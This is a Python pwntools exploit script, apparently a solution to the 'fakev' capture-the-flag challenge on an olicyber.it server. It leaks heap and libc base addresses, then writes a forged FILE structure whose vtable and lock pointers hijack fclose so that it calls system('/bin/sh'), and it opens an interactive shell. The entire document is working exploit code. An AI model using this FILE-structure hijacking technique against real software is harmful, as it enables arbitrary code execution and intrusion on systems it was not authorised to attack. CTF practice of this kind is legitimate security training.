#!/usr/bin/env python3

from pwn import *

elf = ELF("./fakev_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = elf
context.terminal = ('kgx', '-e')

def conn():
    if args.REMOTE:
        r = remote("fakev.challs.olicyber.it", 11004)
    elif args.GDB:
        r = gdb.debug(elf.path, '''
                                b open_file
                                b close_file
                                ignore 1 16
                                ignore 2 8
                                continue
                      ''')
    else:
        r = process(elf.path)

    return r


def main():
    r = conn()

    for i in range(8):
        r.sendlineafter(b": ", b"1")
        r.sendlineafter(b": ", b"1") # file
    
    for i in range(8):
        r.sendlineafter(b": ", b"4")

    r.sendlineafter(b": ", b"2")
    r.sendlineafter(b": ", b"1")
    content = r.recvline()

    heap_base, libc_base = u64(content[0:8]) - 0x250, u64(content[8:16]) - 0x3e7000 - 0x4ca0
    log.success(f"Heap base: {hex(heap_base)}")
    log.success(f"Libc base: {hex(libc_base)}")
    libc.address = libc_base

    for i in range(9):
        r.sendlineafter(b": ", b"1")
        r.sendlineafter(b": ", b"1")

    # this will be placed at elf.sym["choice_string"]
    payload = b"4"+b"\x00"*7 + flat({
            0x00: 0x0, # flags
            0x38: next(libc.search(b"/bin/sh\x00")),
            0x88: elf.sym["choice_string"]+0x8, # lock
            0xa0: elf.sym["choice_string"]+0x8, # FILE* in linked list, this will be the argument of fclose
            0xa8: 0x0, # next ptr in linked list
            0xc8: 0x0,
            0xd8: libc.sym["_IO_file_jumps"] + 0xc0,
            0xe8: libc.sym["system"]
        }, filler=b"\x00", length=0xf8)

    r.sendlineafter(b": ", payload)

    r.interactive()


if __name__ == "__main__":
    main()
